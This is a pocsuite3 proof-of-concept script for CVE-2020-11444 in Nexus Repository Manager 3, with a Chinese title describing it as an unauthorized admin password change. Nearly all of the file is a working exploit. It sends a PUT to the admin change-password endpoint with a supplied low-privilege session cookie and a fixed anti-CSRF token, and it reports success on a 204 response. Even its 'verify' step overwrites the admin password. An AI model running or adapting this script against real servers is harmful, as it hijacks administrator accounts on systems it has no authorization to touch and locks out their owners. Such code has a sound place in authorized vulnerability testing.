#!/usr/bin/env python
# _*_ encoding：utf-8 _*_

from pocsuite3.api import POCBase
from pocsuite3.api import register_poc
from pocsuite3.api import Output
from collections import OrderedDict
from pocsuite3.api import OptString
from pocsuite3.api import requests


class Nexus(POCBase):
    vulID = ''
    version = '1.0'
    author = ['big04dream']
    vulDate = '2020-04-02'
    createDate = '2020-04-02'
    updateDate = '2020-06-30'
    references = ['']
    name = 'Nexus 3 任意修改admin密码越权漏洞'
    appPowerLink = 'https://oss.sonatype.org/'
    appName = 'Nexus 3'
    appVersion = 'Nexus 3'
    vulType = 'unauthorized'
    desc = '''
    Nexus 3 任意修改admin密码越权漏洞（cve-2020-11444）
    '''

    def _options(self):
        o = OrderedDict()
        o['session'] = OptString('', description='current nexus session', require=False)
        o['password'] = OptString('', description='set admin password', require=False)
        return o

    def _verify(self):
        result = {}
        try:
            target = self.url + '/service/rest/beta/security/users/admin/change-password'
            data = """%s""" % self.get_option('password')
            r = requests.put(target, data=data, headers=self._headers)
            if r.status_code == 204:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = target
                result['VerifyInfo']['Password'] = self.get_option('password')
                result['VerifyInfo']['Info'] = 'change password success'
        except:
            pass
        return self.parse_output(result)

    @property
    def _headers(self):
        headers = {
            'accept': "application/json",
            'User-Agent': "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36",
            'NX-ANTI-CSRF-TOKEN': "0.6080434247960143",
            'Content-Type': "text/plain",
            'Origin': "http://127.0.0.1:8081",
            'Cookie': "NX-ANTI-CSRF-TOKEN=0.6080434247960143; NXSESSIONID=" + self.get_option('session') + ""
        }
        return headers

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('not vulnerability')
        return output


register_poc(Nexus)